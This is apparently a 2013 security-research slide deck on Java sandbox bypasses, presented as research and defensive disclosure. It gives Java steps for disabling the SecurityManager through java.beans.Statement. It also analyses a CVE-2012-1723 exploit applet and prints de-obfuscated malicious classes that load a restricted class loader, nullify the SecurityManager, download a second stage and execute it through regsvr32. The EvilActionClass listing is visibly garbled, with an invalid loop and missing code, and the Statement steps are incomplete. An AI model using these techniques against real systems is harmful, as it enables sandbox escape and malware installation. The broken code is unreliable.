# Java Beans Statement and Exploitation Techniques

## Overview
The `java.beans.Statement` class represents a single Java statement, such as `instanceVariable.instanceMethod(argument1)`. It includes an `AccessControlContext` instance variable, which can be replaced with one that has `AllPermission`.

### Steps to Exploit
1. **Create the Statement:**
   ```java
   Statement s = new Statement(System.class, "setSecurityManager", new Object[1]);
   ```

2. **Replace the AccessControlContext with a More Powerful One:**
   ```java
   Permissions p = new Permissions();
   p.add(new AllPermission());
   AccessControlContext acc = new AccessControlContext(new ProtectionDomain[]{new ProtectionDomain(null, p)});
   ```

3. **Execute the Statement:**
   ```java
   s.execute();
   ```

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

## Case Study: CVE-2012-1723

### Vulnerability in the HotSpot Bytecode Verifier
- **Type Confusion:** This vulnerability leads to type confusion.
- **Characteristics:**
  - At least 100 instance variables of a class (do not need to be set).
  - A static variable of another class.
  - A method within the class that:
    - Takes the static class' type.
    - Returns the instance variables' type.
    - Repeated calls to this method with `null` as the sole argument.

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Class Files Analysis
- **Six Class Files:**
  - **Useful Classes:**
    - **Adw.class:**
      - Contains three static methods, but only one is used.
    - **dqqOzf.class:**
      - Implements `PrivilegedExceptionAction`.
      - Contains a call to `System.setSecurityManager`.
    - **qWodxNpkOs.class:**
      - Extends `Applet`.
      - Execution starts in its `init` method.
  - **Unused Classes:**
    - **dumppzGr.class:**
      - No static initializer.
      - Never referenced.
    - **qFvtPH.class:**
      - No static initializer.
      - Never referenced.
    - **vceBGI.class:**
      - No static initializer.
      - Never referenced.

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### De-obfuscation and Analysis
- **De-obfuscation:**
  - Need to de-obfuscate to find the actual CVE.
  - Obfuscated with Allitori’s Java Obfuscator.
  - Did not use options such as code flow obfuscation.
  - Apply compiler optimizations to de-obfuscate:
    - Constant Propagation
    - Dead Code Elimination
    - Function Inlining
    - Function Evaluation

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Example of De-obfuscation
#### Constant Propagation and Function Evaluation
```java
public static URL RWdvAlV(String paramString, int paramInt) throws Exception {
  String str = paramString;
  str += (char)(Math.min(113, 2454) + paramInt);
  str += (char)(Math.min(116, 23544) + paramInt);
  str += (char)(Math.min(109, 23544) + paramInt);
  str += (char)(Math.min(66, 7275) + paramInt);
  str += (char)(Math.min(55, 3235) + paramInt);
  str += (char)(Math.min(55, 2225) + paramInt);
  str += (char)(Math.min(55, 6275) + paramInt);
  return new URL(str);
}
```
- **Example Call:**
  ```java
  RWdvAlV('f', -8)
  ```
  - **Result:**
    ```java
    new URL("file:///")
    ```

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

#### Dead Code Elimination and Function Inlining
```java
int wRXNjHtp(String paramString, int paramInt1, int paramInt2, long paramLong) {
  int i = Math.min(333856, 207293) ^ 0x66493;
  int j = Math.min(421682, 199391) % 85754;
  int k = Math.abs(263858) + 211007;
  int m = Math.abs(23452) + 221538;
  return paramInt1 * 324346 + paramInt1 % 98101;
}
```
- **Optimized:**
  ```java
  int wRXNjHtp(int paramInt1) {
    return paramInt1 * 324346 + paramInt1 % 98101;
  }
  ```

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### EvilApplet (formerly qWodxNpkOs)
```java
package cve_2012_1723;

import com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory;
import com.sun.org.glassfish.gmbal.util.GenericConstructor;
import java.applet.Applet;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;

public class EvilApplet extends Applet {
  public void init() {
    String str = System.getProperty("java.version");
    if (str.indexOf("1.7") != -1) {
      try {
        ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
        byte[] arrayOfByte = new byte[8192];
        InputStream localInputStream = getClass().getResourceAsStream("dqqOzf.class");
        int i;
        while ((i = localInputStream.read(arrayOfByte)) > 0) {
          localByteArrayOutputStream.write(arrayOfByte, 0, i);
        }
        arrayOfByte = localByteArrayOutputStream.toByteArray();
        GenericConstructor localGenericConstructor = new GenericConstructor(Object.class, "sun.invoke.anon.AnonymousClassLoader", new Class[0]);
        Object localObject = localGenericConstructor.create(new Object[0]);
        Method localMethod = ManagedObjectManagerFactory.getMethod(localObject.getClass(), "loadClass", new Class[] { Byte[].class });
        Class ACLdqqOzf = (Class)localMethod.invoke(localObject, new Object[] { arrayOfByte });
        EvilActionClass.triggerDoPrivBlock(getParameter("Sjuzeod"), ACLdqqOzf);
      } catch (Exception e) {}
    }
  }
}
```

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### EvilActionClass (formerly dqqOzf)
```java
package cve_2012_1723;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class EvilActionClass implements PrivilegedExceptionAction {
  public EvilActionClass(String paramString1) {
    try {
      AccessController.doPrivileged(this);
      getSaveAndRunSecondStage(paramString1);
    } catch (Exception e) {}
  }

  public static void triggerDoPrivBlock(String obfuscatedURL, Class paramClass) throws Exception {
    String[] arrayOfString = obfuscatedURL.split("hj");
    String url = "";
    int i = 0;
    while (i = 0) {
      bos.write(buf, 0, i);
    }
    bos.close();
    bis.close();
    try {
      Process localProcess = new ProcessBuilder(new String[] { droppedFileName }).start();
    } catch (Exception localException) {}
    Process localProcess2 = new ProcessBuilder(new String[]{"regsvr32.exe", "/s", droppedFileName}).start();
    } catch (Exception e) {}
  }
}
```

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### De-Obfuscated Functionality
1. **GenericConstructor** instantiates a restricted class, `AnonymousClassLoader`.
2. **ManagedObjectManagerFactory** is used to get access to the `loadClass` instance method of `AnonymousClassLoader`.
3. **AnonymousClassLoader** is used to load a malicious subclass of `PrivilegedExceptionAction`.
4. **A function inside the malicious subclass is executed.**
5. **De-obfuscate a URL to grab the second stage from.**
6. **Instantiate the subclass with the URL.**
7. **The constructor calls `AccessController.doPrivileged()` on itself.**
8. **The `run` method is executed to nullify the `SecurityManager`.**
9. **Download the second stage and execute it.**

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Pwn2Own 2013
- **$20,000 Dollar Question:**
  - **Expectation:** Sandbox bypasses due to unsafe reflection.
  - **Reality:** The top 4 vulnerability types affecting Java.

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Vendor Response Review
- **Lather, Rinse, Repeat:**
  - **Handling Vulnerability Disclosure:**
    - ZDI vulnerabilities patched within 3 months of submission.
    - Improved vulnerability turnaround time over the last three years.
  - **Aggressively Adjust Attack Surface:**
    - “Killed” 15 Zero Day Initiative cases due to patching.
    - JDK 7u13 killed three untrusted pointer dereferencing cases.
    - JDK 7u15 killed two least privilege violation cases.
    - Increased applet package restrictions.
    - Tightening up least privilege violations.
  - **Increased Patch Update Cycle:**
    - 4 releases a year.

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Package Restriction List Modifications
- **Full Package Restriction List for JDK 7u25:**
  - `sun`
  - `com.sun.org.apache.xalan.internal.xslt`
  - `org.mozilla.jss`
  - `com.sun.xml.internal`
  - `com.sun.org.apache.xalan.internal.xsltc.cmdline`
  - `com.sun.browser`
  - `com.sun.imageio`
  - `com.sun.org.apache.xalan.internal.xsltc.compiler`
  - `com.sun.glass`
  - `com.sun.istack.internal`
  - `com.sun.org.apache.xalan.internal.xsltc.trax`
  - `com.sun.javafx`
  - `com.sun.jmx`
  - `com.sun.org.apache.xalan.internal.xsltc.util`
  - `com.sun.media.jfxmedia`
  - `com.sun.proxy`
  - `com.sun.org.apache.xml.internal.res`
  - `com.sun.media.jfxmediaimpl`
  - `com.sun.org.apache.bcel.internal`
  - `com.sun.org.apache.xml.internal.serializer.utils`
  - `com.sun.openpisces`
  - `com.sun.org.apache.regexp.internal`
  - `com.sun.org.apache.xml.internal.utils`
  - `com.sun.prism`
  - `com.sun.org.apache.xerces.internal`
  - `com.sun.org.apache.xml.internal.security`
  - `com.sun.scenario`
  - `com.sun.org.apache.xpath.internal`
  - `com.sun.org.glassfish`
  - `com.sun.t2k`
  - `com.sun.org.apache.xalan.internal.extensions`
  - `org.jcp.xml.dsig.internal`
  - `com.sun.webpane`
  - `com.sun.org.apache.xalan.internal.lib`
  - `com.sun.java.accessibility`
  - `com.sun.pisces`
  - `com.sun.org.apache.xalan.internal.res`
  - `com.sun.javaws`
  - `com.sun.webkit`
  - `com.sun.org.apache.xalan.internal.templates`
  - `com.sun.deploy`
  - `com.sun.org.apache.xalan.internal.utils`
  - `com.sun.jnlp`

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Conclusion
- **Oracle Weathered Quite the Storm:**
  - Large number of vulnerability discoveries.
  - 50+ new Zero Day Initiative submissions over the last 3 quarters.
  - 0-day vulnerabilities leveraged by advisories.
  - Largest Java security patches to date.
  - Focus on sandbox bypasses.
  - Unsafe reflection most prolific issue.
  - Type confusion most exploited vulnerability.
  - 2D sub-component produces most severe vulnerabilities but not utilized.
  - Process improvements by Oracle.
  - More frequent security patch schedule.
  - Modifications to reduce attack surface.

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

### Thank You!
- **ZDI Researchers Submitting Java Vulnerabilities Over Last Three Years:**
  - Alin Rad Pop
  - PI:EMAIL
  - Anonymous
  - axtaxt
  - Ben Murphy
  - Chris Ries
  - James Forshaw
  - Joshua J. Drake
  - Michael Schierl
  - Peter Vreugdenhil
  - Sami Koivu
  - Vitaliy Toropov
  - VUPEN Security
  - Mario Vuksan of Reversing Labs
  - Adam Gowdiak of Security Explorations

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.

---

**Good Luck Bug Hunting!**
- Learn more at:
  - [zerodayinitiative.com](https://zerodayinitiative.com)
  - [hp.com/go/hpsr](https://hp.com/go/hpsr)
  - [java.com/en/download/uninstall.jsp](https://java.com/en/download/uninstall.jsp)

© Copyright 2013 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice.